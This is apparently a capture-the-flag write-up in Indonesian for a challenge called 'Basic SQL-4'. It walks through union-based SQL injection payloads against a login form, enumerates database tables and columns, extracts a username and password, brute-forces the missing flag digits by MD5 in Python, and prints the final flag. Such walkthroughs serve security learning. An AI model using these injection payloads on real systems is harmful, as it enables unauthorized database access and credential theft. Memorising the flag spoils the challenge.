<h1><b>Basic SQL-4</h1></b>
<pre>
Login form (username & password)
</pre>
</b><h3>Solution</h3></b>
<p>Pertama lakukan injection sederhana <b>'or''='</b> untuk username dan password, maka muncul pesan</p>
<pre align='center'>
<b>Username for not_admin incorrect</b>
</pre>
<p align='justify'>Didapatkan username yaitu not_admin, dan setelah dilakukan berbagai metode injection saya tidak dapat mebypass login form tersebut walaupun tidak terdapat filter pada form username. Sepertinya pemeriksaan username dan password secara terpisah pada program dan pada form password terdapat filter string yang impossible</p>


<p>jadi kita hanya dapat melakukan injection pada form username, selanjutnya kita akan melakukan serangan union injection pada form username</p>

<p align='justify'>- Lakukan injection <b>1' union select 1,2 -- -</b> pada form dan lakukan dengan menambahkan list nilai hingga muncul pesan error. Dan kita mendapatkan error pada <b>1' union select 1,2,3 -- -</b>, yang artinya hanya terdapat 2 column, dan injection yang kita gunakan yaitu <b>1' union select 1,2 -- -</b> memunculkan pesan</p>
<pre align='center'>
<b>Username for 1 incorrect</b>
</pre>
<p align='justify'>- Dan mencoba injection nama table dengan sintax <b>1' union select database(),2#</b>, maka diperoleh nama table yaitu CTF</p>
<pre align='center'>
<b>Password for CTF incorrect</b>
</pre>
<p align='justify'>- Selanjutnya, injection untuk mendapatkan nama table pada database CTF
<b>1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='CTF'),2#</b>, pada injection kita mencari nama table name menurut metadata dari information_schema SQL untuk mendapatkan seluruh table CTF, dan mendapatkan beberapa table yang salah satunya table untuk challenge ini(SQL_Challenge5), dan berikut eksekusinya pada mysql</p>

```mysql
MariaDB [CTF]> select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='CTF';
+------------------------------------------------------------------------------------------------------------------+
| group_concat(TABLE_NAME)                                                                                         |
+------------------------------------------------------------------------------------------------------------------+
| *************************************************************************************************,SQL_Challenge5 |
+------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```

<pre align='center'>
<b>Password for SQL_Challenge6,testing,SQL_Challenge3,SQL_Challenge4,SQL_Challenge1,SQL_Challenge7,SQL_Challenge2,SQL_Challenge5 incorrect</b>
</pre>
<p alugn='justify'>- Lalu eksekusi injection <b>1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='SQL_Challenge5'),2#</b> untuk mendapatkan seluruh nama column dari table SQL_Challenge5, dan berikut eksekusi pada mysql dan pesan pada form</p>

```mysql
MariaDB [CTF]> select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='SQL_Challenge5';
+---------------------------+
| group_concat(COLUMN_NAME) |
+---------------------------+
| username,password         |
+---------------------------+
1 row in set (0.001 sec)

```

<pre align='center'>
<b>Password for username,password incorrect</b>
</pre>
<p align='justify'>- Selanjutnya, jika kita sudah mengetahui nama table salah satunya table <b>SQL_Challenge5</b>, dan ke-2 nama column pada tablenya yaitu <b>username</b> dan <b>password</b>, dan lakukan injection dengan perintah</p> 
<p><b>1' union select (select username from SQL_Challenge5 limit 0,1),2#</b> --> untuk memperoleh username, dan berikut eksekusinya pada mysql</p>

```mysql
MariaDB [CTF]> select username from SQL_Challenge5 limit 0,1;
+-----------+
| username  |
+-----------+
| not_admin |
+-----------+
1 row in set (0.000 sec)

MariaDB [CTF]> 
```
<p><b>1' union select (select password from SQL_Challenge5 limit 0,1),2#</b> --> untuk memperoleh password, dan berikut eksekusinya pada mysql</p>

```mysql
MariaDB [CTF]> select password from SQL_Challenge5 limit 0,1;
+----------+
| password |
+----------+
| admin321 |
+----------+
1 row in set (0.000 sec)

MariaDB [CTF]> 
```
<p>Dan mendapatkan username=<b>not_admin</b>, password=<b>admin321</b>, lalu login dan mendapatkan flag yang tidak complete dengan pesan</p>
<pre align='center'>
<b>Flag is VenomCTF{Hybr1t_5QL_4nd_Brut3_a*d*m*i*n}
Note : Flag is not complete
* is numbers 1-9 and hash 35dab6fb8233a807e8662a9055b3af85</b>
</pre>
<p align='justify'>Jadi tantangan selanjutnya diminta untuk melakukan bruteforce dari 4 bytes flag yang hilang dengan ketentuan "*" merupakan integer 0-9 dan MD5hash 35dab6fb8233a807e8662a9055b3af85</p> 

```python
from Crypto.Hash import MD5
from string import digits
import itertools

number = itertools.product(digits,repeat=4)
for i in number:
    flag = 'VenomCTF{Hybr1t_5QL_4nd_Brut3_a'+i[0]+'d'+i[1]+'m'+i[2]+'i'+i[3]+'n}'
    md5 = MD5.new(flag.encode('utf8')).hexdigest()
    if md5 == "35dab6fb8233a807e8662a9055b3af85":
        print(flag) #VenomCTF{Hybr1t_5QL_4nd_Brut3_a1d3m3i7n}
```


</b><h3>Flag</h3></b>
<pre>
VenomCTF{Hybr1t_5QL_4nd_Brut3_a1d3m3i7n}
</pre>
